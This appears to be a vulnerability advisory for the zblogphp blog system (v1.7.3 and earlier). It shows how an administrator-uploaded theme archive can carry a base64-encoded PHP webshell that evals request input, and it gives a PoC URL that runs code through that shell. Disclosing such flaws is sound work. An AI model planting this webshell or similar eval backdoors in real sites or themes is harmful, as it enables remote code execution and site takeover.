# Summary
There is a vulnerability in zblogphp v1.7.3 that allows administrator users to upload custom zba theme files and gain access to the website.

Affected versions:
- zblogphp <= v1.7.3-3230

# Details
Source code can be downloaded from: https://github.com/zblogcn/zblogphp/releases/download/v1.7.3-3230/zblogphp.zip .

After logging in as an administrator, you can upload custom themes here:
![image](https://github.com/user-attachments/assets/577d0bc3-38d4-4cc4-be96-8f81b3699700)

Download a template file from this link: https://app.zblogcn.com/?id=22606.

Open the downloaded zba file and find that the php file content is encrypted with base64:
![image](https://github.com/user-attachments/assets/43419a65-3d38-4475-a92e-56c58145c131)
![image](https://github.com/user-attachments/assets/5e59baa0-50d3-46d8-a25a-c1239f87a76e)

We can add a malicious webshell file ourselves according to the format of this file:
(Note that when writing webshell, you need to wrap the line and cannot write it directly as a sentence.)
```php
<file><path>aymFreeFive/1.php</path><stream>PD9waHAgCkBldmFsKCRfUkVRVUVTVFsxXSk7Cj8+</stream></file>
```

![image](https://github.com/user-attachments/assets/bd4b5952-4d89-46b1-8498-c0bbaa2fbc05)

Then write this content into the zba file:
![image](https://github.com/user-attachments/assets/aa4369be-0d35-46d8-9cdc-4c26601ac032)

Then upload the zba theme file,![image](https://github.com/user-attachments/assets/f536ddcc-4e84-4776-8dd0-829cf54e2506)

Then enable our custom uploaded theme, visit `/zb_users/theme/aymFreeFive/1.php?1=phpinfo()` and we get a shell:
![image](https://github.com/user-attachments/assets/28a4591d-fa00-4fc6-b13b-1caf24d9b63b)

# PoC
`/zb_users/theme/aymFreeFive/1.php?1=phpinfo()`

![image](https://github.com/user-attachments/assets/28a4591d-fa00-4fc6-b13b-1caf24d9b63b)
